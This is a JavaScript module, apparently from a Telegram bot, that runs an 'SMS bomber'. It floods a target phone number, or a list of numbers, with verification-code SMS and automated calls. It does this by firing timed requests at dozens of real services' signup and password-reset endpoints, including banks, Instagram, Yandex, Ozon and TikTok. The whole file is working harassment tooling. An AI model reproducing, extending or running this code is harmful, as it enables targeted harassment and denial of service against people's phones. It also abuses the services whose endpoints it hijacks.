const request = require('request');
const flood_simple_req = require('./services/sms_flood/simple_req_services.js')
const flood_hard_req = require('./services/sms_flood/hard_req_services.js')
const flood_call = require('./services/call_flood/call_flood.js')
const my_functions = require('../scripts/funcs.js')
const headers_data = require('./headers.js')

module.exports = {

	test_flood_array : [
		function(number) {flood_simple_req.single_req_post('Youla', flood_simple_req.youla.url, flood_simple_req.youla.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Yandex_eda', flood_simple_req.yandex_eda.url, flood_simple_req.yandex_eda.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Korona pay', flood_simple_req.korona.url, flood_simple_req.korona.body_data(number), headers_data.url_enc_headers, 'yes', number)}
		// function(number) {flood_simple_req.single_req_post('Anytime', flood_simple_req.anytime.url, flood_simple_req.anytime.body_data(number), headers_data.url_XML_headers, 'no')}
	],
			

	main_flood_array : [
		function(number) {flood_simple_req.single_req_post('Kaspi', flood_simple_req.kaspi.url, flood_simple_req.kaspi.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_hard_req.eubank(number, 'eubank')},
		function(number) {flood_simple_req.single_req_post('Sulpak', flood_simple_req.sulpak.url, flood_simple_req.sulpak.body_data(number), headers_data.url_XML_headers, 'yes', number)},
		function(number) {flood_hard_req.kolesa(number, 'Kolesa')},
		function(number) {flood_call.ok_ru(number, 'ok_ru')},
		function(number) {flood_hard_req.rutaxi_sms(number, 'rutaxi_sms')},
		function(number) {flood_hard_req.instagram(number, 'instagram')},
		function(number) {flood_hard_req.instagram_2(number, 'instagram_2')},
		function(number) {flood_hard_req.yandex_taxi(number, 'yandex_taxi')},
		function(number) {flood_hard_req.satu(number, 'Satu')},
		//function(number) {flood_hard_req.ffins_creat(number, 'ffins_creat')},
		function(number) {flood_hard_req.ffins_reset(number, 'ffins_reset')},
		function(number) {flood_simple_req.single_req_post('Youla', flood_simple_req.youla.url, flood_simple_req.youla.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Tinkoff', flood_simple_req.tinkoff.url, flood_simple_req.tinkoff.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Sberfood', flood_simple_req.sberfood.url, flood_simple_req.sberfood.body_data(number), headers_data.sberfood_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_get('Nomad', flood_simple_req.nomad.url(number), headers_data.get_simple_header, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Yandex_eda', flood_simple_req.yandex_eda.url, flood_simple_req.yandex_eda.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Korona pay', flood_simple_req.korona.url, flood_simple_req.korona.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('ivi cinema', flood_simple_req.ivi.url, flood_simple_req.ivi.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Unacademy', flood_simple_req.unacademy.url, flood_simple_req.unacademy.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Citilink', flood_simple_req.citilink.url(number), flood_simple_req.citilink.body_data(number), headers_data.url_XML_headers, 'yes', number)},
		function(number) {flood_call.rutaxi_call(number, 'rutaxi_call')},
		function(number) {flood_simple_req.single_req_post('Etm', flood_simple_req.etm.url, flood_simple_req.etm.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_get('Qlean', flood_simple_req.qlean.url(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Chocolife', flood_simple_req.chocolife.url, flood_simple_req.chocolife.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Del_papa', flood_simple_req.del_papa.url, flood_simple_req.del_papa.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Iconjob', flood_simple_req.iconjob.url, flood_simple_req.iconjob.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Supermenu', flood_simple_req.supermenu.url(number), flood_simple_req.supermenu.body_data, headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Kaspi', flood_simple_req.sushiwok.url, flood_simple_req.sushiwok.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_call.autocall(number, 'autocall')},
		function(number) {flood_simple_req.single_req_post('Kaspi', flood_simple_req.kaspi.url, flood_simple_req.kaspi.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_hard_req.eubank(number, 'eubank')},
		function(number) {flood_hard_req.kolesa(number, 'Kolesa')},
		function(number) {flood_hard_req.instagram(number, 'instagram')},
		function(number) {flood_hard_req.instagram_2(number, 'instagram_2')},
		function(number) {flood_hard_req.yandex_taxi(number, 'yandex_taxi')},
		function(number) {flood_hard_req.satu(number, 'Satu')},
		function(number) {flood_simple_req.single_req_get('Zenge', flood_simple_req.zenge.url(number), headers_data.url_XML_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Tanuki', flood_simple_req.tanuki.url, flood_simple_req.tanuki.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Thefroot', flood_simple_req.thefroot.url, flood_simple_req.thefroot.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_call.findclone(number, 'findclone')},
		function(number) {flood_simple_req.single_req_post('Mail_kz', flood_simple_req.mail_kz.url, flood_simple_req.mail_kz.body_data(number), headers_data.url_XML_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Sulpak', flood_simple_req.sulpak.url, flood_simple_req.sulpak.body_data(number), headers_data.url_XML_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Mi_com', flood_simple_req.mi_com.url, flood_simple_req.mi_com.body_data(number), headers_data.url_XML_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Evrika', flood_simple_req.evrika.url, flood_simple_req.evrika.body_data(number), headers_data.url_XML_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Sushiwok_recover', flood_simple_req.sushiwok_recover.url, flood_simple_req.sushiwok_recover.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Rutube_list', flood_simple_req.rutube_list.url, flood_simple_req.rutube_list.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Leman', flood_simple_req.leman.url, flood_simple_req.leman.body_data(number), headers_data.json_XML_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Kaztube', flood_simple_req.kaztube.url, flood_simple_req.kaztube.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Tinkoff', flood_simple_req.tinkoff.url, flood_simple_req.tinkoff.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Tiktok', flood_simple_req.tiktok.url, flood_simple_req.tiktok.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_call.calldog(number, 'calldog')},
		function(number) {flood_simple_req.single_req_post('Sberfood', flood_simple_req.sberfood.url, flood_simple_req.sberfood.body_data(number), headers_data.sberfood_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Kaspi', flood_simple_req.kaspi.url, flood_simple_req.kaspi.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Cloud_mail', flood_simple_req.cloud_mail.url, flood_simple_req.cloud_mail.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Lenta', flood_simple_req.lenta.url, flood_simple_req.lenta.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_get('Raiffeisen', flood_simple_req.raiffeisen.url(number), headers_data.get_simple_header, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Icq', flood_simple_req.icq.url, flood_simple_req.icq.body_data(number), headers_data.json_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Makarolls', flood_simple_req.makarolls.url, flood_simple_req.makarolls.body_data(number), headers_data.macorols_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Mousam', flood_simple_req.mousam.url, flood_simple_req.mousam.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Friendsclub', flood_simple_req.friendsclub.url, flood_simple_req.friendsclub.body_data(number), headers_data.url_XML_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Eurasia36', flood_simple_req.eurasia36.url, flood_simple_req.eurasia36.body_data(number), headers_data.eurasia36_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_get('Nomad', flood_simple_req.nomad.url(number), headers_data.get_simple_header, 'yes', number)},
		function(number) {flood_hard_req.instagram(number, 'instagram')},
		function(number) {flood_hard_req.instagram_2(number, 'instagram_2')},
		function(number) {flood_hard_req.yandex_taxi(number, 'yandex_taxi')},
		function(number) {flood_hard_req.satu(number, 'Satu')},
		//function(number) {flood_hard_req.ffins_creat(number, 'ffins_creat')},
		function(number) {flood_hard_req.ffins_reset(number, 'ffins_reset')},
		function(number) {flood_call.ok_ru(number, 'ok_ru')},
		function(number) {flood_simple_req.single_req_post('BCC', flood_simple_req.bcc.url, flood_simple_req.bcc.body_data(number), headers_data.bcc_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Kaspi', flood_simple_req.kaspi.url, flood_simple_req.kaspi.body_data(number), headers_data.url_enc_headers, 'yes', number)},
		function(number) {flood_hard_req.eubank(number, 'eubank')},
		function(number) {flood_hard_req.rutaxi_sms(number, 'rutaxi_sms')},
		function(number) {flood_hard_req.kolesa(number, 'Kolesa')},
		function(number) {flood_hard_req.satu(number, 'Satu')},
		function(number) {flood_call.rutaxi_call(number, 'rutaxi_call')},
		function(number) {flood_simple_req.single_req_post('Altbalaji', flood_simple_req.altbalaji.url, flood_simple_req.altbalaji.body_data(number), headers_data.altbalaji_headers, 'yes', number)},
		function(number) {flood_simple_req.single_req_post('Ozon', flood_simple_req.ozon.url, flood_simple_req.ozon.body_data(number), headers_data.ozon_headers, 'yes', number)}
	],

	start_single_flood (ctx, number) {
		for (let i = 0; i < this.main_flood_array.length; i++) {
			setTimeout(() => {
				
				if (i === this.main_flood_array.length - 1) {
					ctx.reply('Flood на номер ' + my_functions.output_number_data_single(number) + ' был завершен!')					
				}

				this.main_flood_array[i](number);
				
			}, i * 3500);
		}
	},

	start_scope_flood (ctx, number) {
		for (let i = 0; i < this.main_flood_array.length; i++) {
			setTimeout(() => {
				if (i === this.main_flood_array.length - 1) {
					ctx.reply('Flood на номера:\n' + my_functions.output_number_data_scope(number) + 'Был завершен!')					
				}

				for (let k = 0; k < number.length; k++) {
					setTimeout(() => {
						this.main_flood_array[i](number[k]);
					}, k * 200)
				}
			}, i * 3500)
		}
	}, 

	test_single_flood (ctx, number) {
		for (let i = 0; i < this.test_flood_array.length; i++) {
			setTimeout(() => {
				if (i === this.test_flood_array.length - 1) {
					ctx.reply('Flood на номер ' + my_functions.output_number_data_single(number) + ' был завершен!')					
				}

				this.test_flood_array[i](number);
			}, i * 3500);
		}
	},

	test_scope_flood (ctx, number) {
		for (let i = 0; i < this.test_flood_array.length; i++) {
			setTimeout(() => {
				if (i === this.test_flood_array.length - 1) {
					ctx.reply('Flood на номера:\n' + my_functions.output_number_data_scope(number) + 'Был завершен!')					
				}

				for (let k = 0; k < number.length; k++) {
					setTimeout(() => {
						this.test_flood_array[i](number[k]);
					}, k * 200)
				}
			}, i * 3500)
		}
	}


}